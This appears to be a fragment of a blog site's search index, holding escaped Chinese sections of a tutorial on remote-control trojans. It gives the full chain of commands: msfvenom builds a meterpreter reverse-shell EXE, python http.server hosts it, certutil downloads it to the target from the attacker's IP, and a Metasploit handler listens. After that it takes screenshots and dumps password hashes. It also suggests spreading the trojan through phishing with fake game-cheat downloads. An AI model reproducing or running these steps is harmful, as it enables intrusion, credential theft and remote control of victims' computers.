<p>\u7cfb\u7edf\u6267\u884c\u6728\u9a6c\u6587\u4ef6\u540e\uff0c\u4f1a\u53cd\u8fde\u81f3\u9ed1\u5ba2\u670d\u52a1\u5668\uff0c\u9ed1\u5ba2\u5373\u53ef\u63a7\u5236\u53d7\u5bb3\u8005\u8ba1\u7b97\u673a\u6216\u79fb\u52a8\u8bbe\u5907\uff0c\u5982\u5f00\u542f\u6444\u50cf\u5934\u3001\u5c4f\u5e55\u622a\u56fe\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u8f6f\u4ef6\u5b89\u88c5\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#metasploit-exe","title":"\u4e00\u3001\u4f7f\u7528 Metasploit \u751f\u6210\u4e00\u4e2a EXE \u5b89\u88c5\u5305","text":"<p>Metasploit \u8ba9\u590d\u6742\u7684\u6f0f\u6d1e\u653b\u51fb\u6d41\u7a0b\u53d8\u5f97\u975e\u5e38\u7b80\u5355\uff0c\u4e00\u4e2a\u7535\u8111\u5c0f\u767d\u7ecf\u8fc7\u51e0\u5c0f\u65f6\u7684\u5b66\u4e60\uff0c\u5c31\u80fd\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u7b49\u4e3b\u6d41\u6f0f\u6d1e\u53d1\u8d77\u5371\u5bb3\u6027\u653b\u51fb\u3002</p>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#1-metasploit-msfvenom-exe","title":"1. \u4f7f\u7528 Metasploit \u7684 <code>msfvenom</code> \u751f\u6210\u540e\u95e8 EXE \u6587\u4ef6","text":"<p>\u547d\u4ee4\u683c\u5f0f\u5982\u4e0b\uff1a</p> Bash<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=&lt;\u4f60\u7684IP&gt; lport=&lt;\u4f60\u7684\u7aef\u53e3&gt; -f exe -o &lt;\u6587\u4ef6\u540d&gt;.exe\n</code></pre> <ul> <li><code>LHOST</code>\uff1a\u6307\u5b9a\u653b\u51fb\u8005\u7684 IP \u5730\u5740</li> <li><code>LPORT</code>\uff1a\u6307\u5b9a\u653b\u51fb\u8005\u7684\u76d1\u542c\u7aef\u53e3</li> <li><code>&lt;\u6587\u4ef6\u540d&gt;.exe</code>\uff1a\u8f93\u51fa\u7684\u540e\u95e8 EXE \u6587\u4ef6\u540d</li> </ul>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#_2","title":"\u4e8c\u3001\u5c06\u5bf9\u5e94\u7a0b\u5e8f\u653e\u5165\u76ee\u6807\u673a","text":"<p>\u4e00\u822c\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u4f20\u64ad\uff1a</p> <ol> <li>\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e + \u547d\u4ee4\u6267\u884c\uff08\u4e3b\u52a8\uff09\uff1a\u5982\u5927\u5b66 DVWA\u3001Pikachu</li> <li>\u6587\u4ef6\u4e0b\u8f7d\u9493\u9c7c + \u8bf1\u5bfc\u6267\u884c\uff08\u9493\u9c7c\uff09\uff1a\u5982 CF \u5916\u6302\u7f51\u7ad9\u5916\u6302.exe\u3001Windows \u75c5\u6bd2</li> </ol>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#1-python-http","title":"1. \u5728\u653b\u51fb\u8005\u673a\u5668\u4e0a\u4f7f\u7528 Python \u642d\u5efa HTTP \u670d\u52a1\u5668","text":"Bash<pre><code>python3 -m http.server &lt;\u7aef\u53e3\u53f7&gt;\n</code></pre>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#2-windows-certutil","title":"2. \u5728\u76ee\u6807 Windows \u673a\u5668\u4e0a\u81ea\u4e3b\u4f7f\u7528 <code>certutil</code> \u8bc1\u4e66\u4e0b\u8f7d\u6587\u4ef6","text":"Bash<pre><code>certutil -urlcache -split -f http://&lt;\u653b\u51fb\u8005IP&gt;:&lt;\u7aef\u53e3\u53f7&gt;/&lt;\u6587\u4ef6\u540d&gt;.exe\n</code></pre>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#metasploit-msfconsole","title":"\u4e09\u3001\u5f00\u542f Metasploit \u76d1\u542c\uff08msfconsole\uff09","text":"<p>Metasploit \u662f\u4e00\u6b3e\u5f00\u6e90\u5b89\u5168\u6f0f\u6d1e\u5229\u7528\u548c\u6d4b\u8bd5\u5de5\u5177\uff0c\u96c6\u6210\u4e86\u5404\u79cd\u5e73\u53f0\u4e0a\u5e38\u89c1\u7684\u6ea2\u51fa\u6f0f\u6d1e\u548c\u6d41\u884c\u7684 shellcode\uff0c\u5e76\u6301\u7eed\u4fdd\u6301\u66f4\u65b0\u3002</p>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#1-metasploit","title":"1. \u8fdb\u5165 Metasploit \u63a7\u5236\u53f0","text":"Bash<pre><code>msfconsole\n</code></pre>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#2","title":"2. \u4f7f\u7528\u6a21\u5757\u5e76\u8bbe\u7f6e\u76f8\u5173\u53c2\u6570","text":"Bash<pre><code>use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lhost &lt;\u653b\u51fb\u8005IP&gt;\nset lport &lt;\u7aef\u53e3\u53f7&gt;\n</code></pre>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#3","title":"3. \u542f\u52a8\u76d1\u542c","text":"Bash<pre><code>run\n</code></pre>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#windows","title":"\u56db\u3001\u5c1d\u8bd5\u83b7\u53d6\u76ee\u6807 Windows \u673a\u7684\u4fe1\u606f","text":""},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#1","title":"1. \u622a\u56fe\u547d\u4ee4","text":"<p>\u83b7\u53d6\u76ee\u6807\u673a\u7684\u5f53\u524d\u5c4f\u5e55\u622a\u56fe\uff1a</p> Bash<pre><code>screenshot\n</code></pre>"},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/#2_1","title":"2. \u83b7\u53d6\u5bc6\u7801","text":"<p>\u5c1d\u8bd5\u63d0\u53d6\u5bc6\u7801\u6563\u5217\uff1a</p> Bash<pre><code>hashdump\n</code></pre> <p>\u6ce8\u610f\uff1a\u5982\u679c\u5bc6\u7801\u8d85\u8fc7 8 \u4f4d\u4e14\u5305\u542b\u591a\u79cd\u5143\u7d20\uff0c\u7834\u89e3\u96be\u5ea6\u4f1a\u589e\u52a0\u3002</p>"}]}